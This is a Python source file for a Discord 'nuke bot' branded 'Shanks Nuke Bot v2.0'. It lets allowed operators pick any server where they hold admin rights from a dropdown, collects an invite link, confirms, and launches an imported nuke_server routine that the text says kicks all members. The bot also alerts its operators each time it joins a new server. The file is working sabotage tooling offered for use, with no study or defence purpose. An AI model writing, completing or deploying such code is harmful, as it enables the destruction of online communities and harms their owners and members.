import os
import asyncio
import discord
from discord.ext import commands
from discord import ui
from discord.ui import Select, View, SelectOption  # ✅ Sahi import
from dotenv import load_dotenv
from utils import get_admin_guilds, format_guild_list
from nuker import nuke_server

load_dotenv()
TOKEN = os.getenv("BOT_TOKEN")
ALLOWED_USERS = [int(x.strip()) for x in os.getenv("ALLOWED_USERS", "").split(",") if x.strip().isdigit()]
WHITELIST_SERVER_ID = int(os.getenv("WHITELIST_SERVER_ID", 0))

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

# Remove default help command
bot.remove_command("help")

# ------------------ Auto message on guild join ------------------
@bot.event
async def on_guild_join(guild):
    """Send a beautiful message to all allowed users when bot joins a new server."""
    embed = discord.Embed(
        title="🎉 New Server Joined!",
        description=f"✅ Successfully joined **{guild.name}** (ID: `{guild.id}`)",
        color=discord.Color.green()
    )
    embed.add_field(name="👥 Members", value=guild.member_count)
    embed.add_field(name="👑 Owner", value=guild.owner.mention if guild.owner else "Unknown")
    embed.set_footer(text="🔥 Shanks Bot is ready to serve!")
    embed.timestamp = discord.utils.utcnow()

    for user_id in ALLOWED_USERS:
        user = bot.get_user(user_id)
        if user:
            try:
                await user.send(embed=embed)
            except:
                pass

# ------------------ On message (only allowed users) ------------------
@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    if message.author.id not in ALLOWED_USERS:
        return
    if not isinstance(message.channel, discord.DMChannel):
        return
    await bot.process_commands(message)

# ------------------ Dropdown for server selection ------------------
class ServerSelect(Select):
    def __init__(self, guilds, author):
        options = []
        for g in guilds:
            # Check if whitelisted
            if g.id == WHITELIST_SERVER_ID:
                label = f"🔒 {g.name[:90]}"  # 🔒 emoji for whitelisted
                description = f"🛡️ Whitelisted - Cannot nuke"
            else:
                label = f"🔥 {g.name[:90]}"
                description = f"👥 {g.member_count} members"
            
            options.append(SelectOption(
                label=label[:100],  # Max 100 chars
                value=str(g.id),
                description=description[:100],  # Max 100 chars
                emoji="🔒" if g.id == WHITELIST_SERVER_ID else "🔥"
            ))
        
        super().__init__(
            placeholder="📋 Select a server to nuke...",
            options=options,
            min_values=1,
            max_values=1
        )
        self.guilds = guilds
        self.author = author

    async def callback(self, interaction: discord.Interaction):
        # Check if same user
        if interaction.user.id != self.author.id:
            await interaction.response.send_message("❌ You can't use this menu.", ephemeral=True)
            return

        guild_id = int(self.values[0])
        guild = bot.get_guild(guild_id)
        
        if not guild:
            await interaction.response.send_message("❌ Server not found.", ephemeral=True)
            return

        # Check whitelist
        if guild.id == WHITELIST_SERVER_ID:
            embed = discord.Embed(
                title="🛡️ Access Denied!",
                description=f"**{guild.name}** is whitelisted by Shanks!",
                color=discord.Color.red()
            )
            embed.add_field(name="🔒 Status", value="**Impossible to nuke**", inline=False)
            embed.add_field(name="👑 Owner", value=guild.owner.mention if guild.owner else "Unknown", inline=True)
            embed.add_field(name="👥 Members", value=guild.member_count, inline=True)
            embed.set_footer(text="This server is under Shanks' protection!")
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        # Ask for invite link
        embed = discord.Embed(
            title="🔗 Server Invite Link",
            description=f"Please send the **permanent invite link** for **{guild.name}** in this DM.",
            color=discord.Color.blue()
        )
        embed.add_field(name="📝 Instructions", value="Type the invite link in this DM (e.g., https://discord.gg/abc123)", inline=False)
        embed.set_footer(text="This link will be sent to all kicked members.")
        
        await interaction.response.send_message(embed=embed, ephemeral=False)

        # Wait for invite link
        def check(m):
            return m.author == interaction.user and m.channel == interaction.channel and "discord.gg" in m.content.lower()

        try:
            msg = await bot.wait_for("message", check=check, timeout=60)
            invite_link = msg.content.strip()
        except asyncio.TimeoutError:
            await interaction.followup.send("❌ Timeout! Please try again with `!list`.")
            return

        # Confirm nuke
        confirm_embed = discord.Embed(
            title="⚠️ CONFIRM NUKE",
            description=f"Are you sure you want to nuke **{guild.name}**?",
            color=discord.Color.orange()
        )
        confirm_embed.add_field(name="📊 Members", value=f"{guild.member_count} members will be kicked", inline=True)
        confirm_embed.add_field(name="🔗 Invite", value=f"`{invite_link}`", inline=True)
        confirm_embed.set_footer(text="Type 'YES' to confirm or 'NO' to cancel (30 seconds)")
        
        await interaction.followup.send(embed=confirm_embed)

        def confirm_check(m):
            return m.author == interaction.user and m.channel == interaction.channel and m.content.upper() in ["YES", "NO"]

        try:
            confirm_msg = await bot.wait_for("message", check=confirm_check, timeout=30)
            if confirm_msg.content.upper() == "NO":
                await interaction.followup.send("❌ Nuke cancelled.")
                return
        except asyncio.TimeoutError:
            await interaction.followup.send("❌ Nuke cancelled (timeout).")
            return

        # Start nuke with custom invite link
        await interaction.followup.send(f"🔥 **NUKE STARTED** on **{guild.name}**!\nThis may take a while...")
        
        # Pass invite link to nuke function
        asyncio.create_task(nuke_server(guild, bot, interaction.user, invite_link))

class ServerSelectView(View):
    def __init__(self, guilds, author):
        super().__init__(timeout=120)
        self.add_item(ServerSelect(guilds, author))

# ------------------ Commands ------------------
@bot.command(name="list")
async def list_servers(ctx):
    """List all servers where you have Admin (except whitelisted) and provide dropdown."""
    admin_guilds = await get_admin_guilds(bot, ctx.author)
    
    if not admin_guilds:
        embed = discord.Embed(
            title="❌ No Servers Available",
            description="You don't have Administrator permission in any server (except whitelisted).",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return

    # Create beautiful embed
    embed = discord.Embed(
        title="📋 Available Servers",
        description="Select a server from the dropdown below to nuke.",
        color=discord.Color.purple()
    )
    
    # Show whitelisted server info if present
    whitelisted = bot.get_guild(WHITELIST_SERVER_ID)
    if whitelisted:
        embed.add_field(
            name="🛡️ Whitelisted Server",
            value=f"**{whitelisted.name}** (ID: `{WHITELIST_SERVER_ID}`)\n🔒 Protected by Shanks!",
            inline=False
        )
    
    embed.add_field(
        name="📊 Total Servers",
        value=f"{len(admin_guilds)} servers available to nuke",
        inline=False
    )
    embed.set_footer(text="🔥 Shanks Nuke Bot v2.0")
    embed.timestamp = discord.utils.utcnow()
    
    await ctx.send(embed=embed)
    
    # Send dropdown
    view = ServerSelectView(admin_guilds, ctx.author)
    await ctx.send("🎯 **Select a server to nuke:**", view=view)

# ------------------ Error handler ------------------
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("❌ Missing argument. Use `!list` to see servers.")
    else:
        embed = discord.Embed(
            title="❌ Error",
            description=f"```{error}```",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        raise error

# ------------------ Run bot ------------------
if __name__ == "__main__":
    bot.run(TOKEN)
